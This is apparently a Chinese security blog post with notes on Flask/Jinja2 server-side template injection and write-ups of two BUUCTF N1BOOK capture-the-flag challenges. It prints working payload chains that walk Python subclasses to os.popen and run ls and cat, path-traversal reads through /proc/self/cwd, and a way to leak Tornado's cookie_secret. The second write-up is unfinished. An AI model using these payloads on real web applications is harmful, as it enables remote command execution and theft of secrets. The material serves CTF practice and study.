---
title: 服务器模板注入 (SSTI)
date: '2022/1/23 23:15:01'
categories:
  - - WEB安全
    - 注入
    - SSTI
abbrlink: 1e38f0b9
description: ssti注入的流程和相关例题
tags:
---

## 服务器模板注入 (SSTI)

### 基本注入流程

```
''.__class__		显示这个东西的类
''.__class__.base__		找到这个的基类
''.__class__.__base__.__subclasses__()		看基类的子类
```

> 敏感子类
popen、sys、os

```
因为''.__class__.__base__.__subclasses__()返回的是一个列表，
所以直接''.__class__.__base__.__subclasses__()[425]查看的就是popen这个
```
> **注意：这里的425要根据```''.__class__.__base__.__subclasses__()```实际返回的数组，观察Popen的位置来决定**

到了这里就可以使用某些子类来进行操作了，下面使用[177]这个子类```<class 'warnings.catch_warnings'>```进行操作

比如说查看目录
```shell
''.__class__.__base__.__subclasses__()[177].__init__.__globals__["__builtins__"].eval('__import__("os").popen("ls").read()')
```
进一步查看目录下的文件，这里查看的是test目录下的文件
```shell
''.__class__.__base__.__subclasses__()[177].__init__.__globals__["__builtins__"].eval('__import__("os").popen("ls /test").read()')
```
然后读取需要的文件，这里是读取test目录下的flag.py文件
```shell
''.__class__.__base__.__subclasses__()[177].__init__.__globals__["__builtins__"].eval('__import__("os").popen("cat /test/flag.py").read()')
```

### 绕过限制

参考：[https://www.cnblogs.com/zaqzzz/p/10263396.html](https://www.cnblogs.com/zaqzzz/p/10263396.html)

### 通过模板注入获取tornado中的cookie

利用handler.settings对象
因此构造{{handler.settings}}

知识点
> (1)需要的cookie_secret在Application对象settings属性中

> (2)```self.application.settings```有一个别名```RequestHandler.settings```
而因为handler指向的是处理当前这个页面的RequestHandler对象，并且RequestHandler.settings是指向self.application.settings，因此构造的handler.settings指向RequestHandler.application.settings


参考来自：[https://blog.csdn.net/q20010619/article/details/107553119](https://blog.csdn.net/q20010619/article/details/107553119)

***
***

## 题目

### SSTI
> 这是一道来源于BUUCTF的N1BOOK的题目，[第三章 web进阶]SSTI

```shell
7*7
```
观察回显发现是flask模板注入

```shell
''.__class__.__base__.__subclasses__()
```
看看有什么子类可以利用
```shell
''.__class__.base__.__subclasses__()}
```

发现[177]这个子类是```<class 'warnings.catch_warnings'>```

利用它查看目录
```shell
''.__class__.__base__.__subclasses__()[177].__init__.__globals__["__builtins__"].eval('__import__("os").popen("ls").read()')
```
进一步查看app目录下的文件
```shell
''.__class__.__base__.__subclasses__()[177].__init__.__globals__["__builtins__"].eval('__import__("os").popen("ls /app").read()')
```
然后读取server.py文件
```shell
''.__class__.__base__.__subclasses__()[177].__init__.__globals__["__builtins__"].eval('__import__("os").popen("cat /app/server.py").read()')
```

题目有多种解法
参考来自：
[https://blog.csdn.net/CyhDl666/article/details/115004845](https://blog.csdn.net/CyhDl666/article/details/115004845)
[https://blog.csdn.net/qq_51558360/article/details/114493766](https://blog.csdn.net/qq_51558360/article/details/114493766)

### afr_3
> 这是一道来源于BUUCTF的N1BOOK的题目，[第一章 web入门]afr_3

开头是文件包含，经过一系列操作，
**根据```../../../../../proc/self/cmdline```得出的信息可以知道，当前正在运行 ```pythonserver.py```**

**在这里时需要想到，应该利用python的flask进行模板ssti注入，从而读取flag**

根据/proc/的特性，可以读取正在运行的```pythonserver.py```的源码
```?name=../../../../../proc/self/cwd/server.py```
> 原理是使用proc指定self代表当前进程，然后cwd指向运行的文件```pythonserver.py```

得到的信息里面有```flag.py```，但是直接访问显示权限不够
访问另一个的文件```key.py```得到
 ```shell
#!/usr/bin/python 
key = 'Drmhze6EPcv0fN_81Bj-nA'
 ```

后面待续




参考来自：
[https://www.cnblogs.com/murkuo/p/14905749.html](https://www.cnblogs.com/murkuo/p/14905749.html)